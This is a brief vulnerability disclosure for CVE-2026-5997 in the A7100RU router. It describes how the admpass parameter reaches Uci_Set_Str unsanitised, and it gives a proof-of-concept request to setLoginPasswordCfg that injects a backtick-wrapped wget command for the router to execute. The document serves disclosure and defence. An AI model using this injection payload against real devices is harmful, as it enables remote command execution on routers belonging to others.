# A7100RU Vulnerability（CVE-2026-5997）
...
In  sub_421678 function, it reads in a user-provided parameter `admpass` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `admpass` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setLoginPasswordCfg","admpass":"`wget 192.168.6.1:7777/testpoc`"
